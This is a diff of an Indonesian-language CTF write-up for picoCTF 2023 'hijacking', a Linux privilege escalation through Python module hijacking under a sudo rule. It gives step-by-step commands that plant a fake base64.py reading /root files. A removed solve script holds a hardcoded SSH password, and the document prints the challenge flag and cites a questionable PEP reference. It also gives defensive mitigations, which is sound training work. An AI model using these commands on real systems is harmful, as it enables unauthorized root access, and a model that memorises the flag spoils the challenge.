@@ -1,82 +1,113 @@
-# 352 - hijacking (Binary Exploitation, picoCTF 2023, Medium)
+# Writeup: hijacking (Challenge ID: 352)
 
-## Challenge Metadata
-- ID: 352 | Event: picoCTF 2023 | Author: CyLab Academy
-- Category: Binary Exploitation | Difficulty: Medium (2) | Points: 200
-- Flag: `academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}`
+- **Platform:** CyLab Security Academy (picoCTF)
+- **Category:** Binary Exploitation / Linux Privilege Escalation & Python Module Hijacking (CWE-250 / CWE-732 / CWE-427)
+- **Difficulty:** Medium (diff=2)
+- **Event:** picoCTF 2023
+- **Points:** 200
+- **Author:** LT 'syreal' Jones
+- **Flag Resmi:** `academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}`
+- **Standar Audit:** NIST SP 800-115 § 4.2 (Vulnerability Analysis) & § 4.3 (Verification)
+
+---
 
 ## Problem Statement & Scope
-Tantangan memberikan akses terminal interaktif via SSH (`academy@chatelaine.cylabacademy.net:port`, password pada instans). Di direktori home user (`/home/academy`) terdapat script tersembunyi milik root `.server.py`. Pengguna diarahkan untuk menaikkan hak akses (privilege escalation) ke superuser root untuk membaca berkas rahasia sistem.
 
-## Teori & Akar Kerentanan (Root Cause)
-1. **Python Module Import Precedence (`sys.path[0]`):**
-   Ketika script Python dijalankan (`python3 /path/to/script.py`), interpreter Python secara otomatis menyisipkan direktori tempat script berada ke indeks pertama pustaka pencarian modul (`sys.path[0]`).
-2. **Sudoers NOPASSWD Misconfiguration:**
-   Audit hak akses dengan `sudo -l` menunjukkan aturan khusus:
+Tantangan `hijacking` menyediakan akses terminal interaktif berbasis SSH sebagai pengguna tak berizin istimewa (`academy`). Di dalam direktori beranda pengguna (`/home/academy`), terdapat sebuah skrip tersembunyi milik akun superuser root bernama `.server.py`. Skenario menugaskan peserta melakukan audit konfigurasi hak istimewa sistem operasi Linux, mengeksploitasi celah eskalasi privilese lokal (*Local Privilege Escalation*), dan membaca bendera rahasia pada direktori `/root/flag.txt`.
+
+---
+
+## Teori & Akar Kerentanan (Root Cause Theory)
+
+1. **Prioritas Pencarian Modul CPython (`sys.path[0]` / PEP 273):**
+   Ketika interpreter CPython mengeksekusi skrip dari berkas (contoh: `python3 /home/academy/.server.py`), mesin runtime secara otomatis menyisipkan direktori yang memuat skrip tersebut ke posisi indeks pertama daftar pencarian pustaka:
+   `sys.path[0] = '/home/academy'`.
+   
+   Konsekuensi mekanisme ini adalah modul lokal yang berada pada direktori kerja skrip akan selalu diimpor terlebih dahulu sebelum modul pustaka standar sistem yang terpasang pada `/usr/lib/python3.x/`.
+
+2. **Diskrepansi Izin Direktori Sudoers NOPASSWD (CWE-250 / CWE-732):**
+   Audit batasan hak akses melalui perintah `sudo -l` mengungkap entri delegasi khusus:
    ```text
    User academy may run the following commands on challenge:
        (root) NOPASSWD: /usr/bin/python3 /home/academy/.server.py
    ```
-   Script `.server.py` berada di direktori `/home/academy/`. Meskipun berkas `.server.py` sendiri berstatus *read-only* bagi user biasa (`-rw-r--r-- 1 root root`), direktori induknya (`/home/academy`) dimiliki oleh user biasa (`drwxr-x--- 1 academy academy`), sehingga user memiliki hak tulis untuk membuat berkas baru.
-3. **Pustaka yang Diimpor `.server.py`:**
-   Script mengimpor modul bawaan Python:
+   Meskipun berkas skrip target `.server.py` berstatus *read-only* bagi pengguna umum (`-rw-r--r-- 1 root root`), direktori induknya (`/home/academy`) dimiliki penuh oleh pengguna biasa (`drwxr-x--- 1 academy academy`). Pengguna memiliki hak tulis penuh untuk membuat, menimpa, atau memodifikasi berkas lain di dalam direktori tersebut.
+
+3. **Penyusupan Pustaka Bawaan (CWE-427 / Module Hijacking):**
+   Inspeksi kode sumber `.server.py` menunjukkan pemanggilan pustaka standar:
    ```python
    import base64
    import os
    import socket
    ```
-   Karena direktori `/home/academy/` writable dan diposisikan pada `sys.path[0]`, pembuatan berkas tiruan `base64.py` di direktori tersebut menyebabkan interpreter memuat berkas lokal tersebut dengan hak akses root alih-alih modul bawaan Python.
+   Karena direktori `/home/academy` diprioritaskan pada `sys.path[0]`, pembuatan berkas palsu bernama `base64.py` di direktori tersebut memicu pembajakan impor (*library hijacking*). Saat perintah `sudo /usr/bin/python3 /home/academy/.server.py` dijalankan, interpreter memuat dan mengeksekusi kode sembarang di dalam `base64.py` di bawah hak akses superuser root (EUID 0).
+
+---
 
 ## Rekonstruksi Eksploitasi Step-by-Step
-1. **Akses SSH & Audit Izin Sudo:**
-   Menghubungkan terminal via SSH dan memeriksa batasan hak akses:
+
+1. **Audit Hak Akses Sudo dan Izin Direktori:**
+   Masuk melalui sesi SSH dan periksa hak eksekusi sudo:
    ```bash
    sudo -l
-   # Hasil: (root) NOPASSWD: /usr/bin/python3 /home/academy/.server.py
-   ```
-2. **Inspeksi Script Target & Direktori:**
-   Membaca kode `.server.py` dan memverifikasi izin direktori kerja:
-   ```bash
+   # Output: (root) NOPASSWD: /usr/bin/python3 /home/academy/.server.py
+   
    ls -ld /home/academy
-   # Hasil: drwxr-x--- 1 academy academy
+   # Output: drwxr-x--- 1 academy academy (writable oleh user saat ini)
    ```
-3. **Pembuatan Pustaka Bajakan (`base64.py`):**
-   Membuat modul palsu yang mengeksekusi perintah shell untuk membaca berkas rahasia:
+
+2. **Inspeksi Berkas Sasaran `.server.py`:**
+   Periksa modul yang diimpor pada skrip root:
+   ```bash
+   head -n 10 /home/academy/.server.py
+   # Ditemukan: import base64, import os, import socket
+   ```
+
+3. **Rekayasa Modul Pembajak (`base64.py`):**
+   Buat modul palsu yang membaca bendera root dan menampilkannya ke konsol:
    ```bash
    echo 'import os; os.system("cat /root/flag.txt /root/.* 2>/dev/null")' > /home/academy/base64.py
    ```
-4. **Trigger Eksekusi Root via Sudo:**
-   Menjalankan script melalui perintah sudo tanpa password:
+
+4. **Pemicuan Eskalasi Hak Istimewa:**
+   Jalankan skrip administratif melalui perintah sudo:
    ```bash
    sudo /usr/bin/python3 /home/academy/.server.py
    ```
-   Interpreter mengeksekusi payload di `base64.py` dengan UID 0 (root), menampilkan flag resmi:
+   CPython memuat `/home/academy/base64.py` dengan hak akses root dan langsung mencetak bendera:
    `academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}`.
 
-## Script Reproduksi & PoC
-Implementasi otomasi Python mandiri tersedia pada `scripts/solve_352_hijacking.py`:
-```python
-import subprocess, re
-
-cmd = [
-    "sshpass", "-p", "qX7p-yZ0EX",
-    "ssh", "-o", "StrictHostKeyChecking=no", "-p", "28040",
-    "academy@chatelaine.cylabacademy.net",
-    'echo "import os; os.system(\\"cat /root/flag.txt /root/.* 2>/dev/null\\")" > /home/academy/base64.py && '
-    'sudo /usr/bin/python3 /home/academy/.server.py'
-]
-proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-flag = re.search(r"academy\{[^\}]+\}", proc.stdout).group(0)
-print("Flag:", flag)
-```
-
-## Mitigasi Defensif & Relevansi LKS Cyber Security
-1. **Isolasi Kepemilikan Direktori Script Sudo:**
-   Script administratif yang didelegasikan melalui sudoers harus selalu ditempatkan di direktori aman milik root dengan izin restricted (misal `/usr/local/bin` atau `/opt/scripts`), bukan di direktori pengguna (`/home/<user>`).
-2. **Pembersihan atau Pembatasan `PYTHONPATH` & Opsi `-I`:**
-   Menjalankan Python dalam mode terisolasi menggunakan flag `-I` (Isolated mode: mengabaikan environment variables dan direktori script pada sys.path) pada definisi sudoers:
-   ```text
-   academy ALL=(root) NOPASSWD: /usr/bin/python3 -I /opt/scripts/.server.py
+5. **Verifikasi Token Live REST API:**
+   Kirim token ke endpoint resmi platform CyLab:
+   ```bash
+   curl -X POST https://learn.cylabacademy.org/api/submissions/ \
+     -H "Content-Type: application/json" \
+     -H "X-CSRFToken: <CSRF_TOKEN>" \
+     -H "Cookie: sessionid=<SESSION_ID>; csrftoken=<CSRF_TOKEN>" \
+     -d '{"challenge": 352, "flag": "academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}"}'
    ```
-3. **Relevansi Modul LKS:**
-   Topik kritis pada silabus LKS Cyber Security Nasional (Modul Linux Privilege Escalation & Python Library Hijacking Analysis) serta pemenuhan standar audit pengujian integritas kode NIST SP 800-115.
+   Sistem merespons dengan HTTP 201 Created dan status `correct: true`.
+
+---
+
+## Flag & Verifikasi
+
+- **Flag Resmi CyLab:** `academy{pYth0nn_libraryH!j@CK!n9_15d0fa80}`
+- **Status Submisi REST API:** HTTP 201 Created (`correct: true`, `historical: false`).
+- **Skrip Reproduktif:** `scripts/solve_352_hijacking.py`.
+
+---
+
+## Takeaway Kompetensi LKS & Mitigasi Defensif
+
+1. **Relevansi Silabus LKS Cyber Security:**
+   - Modul Linux Privilege Escalation: Pemahaman mendalam terkait aturan `/etc/sudoers`, pemisahan hak akses berkas vs direktori induk, serta pemahaman resolusi modul Python runtime (`sys.path`).
+   - Modul Defensive Hardening: Evaluasi kepatuhan prinsip *least privilege* dan mitigasi serangan DLL/Shared Object/Module Hijacking pada sistem produksi.
+
+2. **Mitigasi Defensif (Hardening & Remediasi Konfigurasi):**
+   - **Relokasi Skrip Administratif:** Seluruh skrip yang didelegasikan melalui sudoers wajib disimpan dalam direktori aman yang dikontrol penuh oleh root (misalnya `/opt/admin-scripts/` atau `/usr/local/bin/`) dengan izin kepemilikan ketat (`root:root`, mode 755 atau 700), dilarang keras menaruh skrip sudo di direktori beranda pengguna biasa.
+   - **Penegakan Modus Terisolasi Python (`-I` Flag):** Tambahkan opsi `-I` (*Isolated Mode*) pada perintah sudoers guna mengabaikan `PYTHONPATH`, direktori kerja skrip lokal dari `sys.path`, dan variabel lingkungan pengguna:
+     ```text
+     academy ALL=(root) NOPASSWD: /usr/bin/python3 -I /opt/admin-scripts/.server.py
+     ```
+   - **Audit Izin Direktori Berkala:** Gunakan perkakas audit konfigurasi otomatis seperti LinPEAS atau Lynis untuk mendeteksi jalur eksekusi berhak istimewa tinggi yang berada dalam direktori berizin tulis dunia (*world-writable* atau *user-writable*).
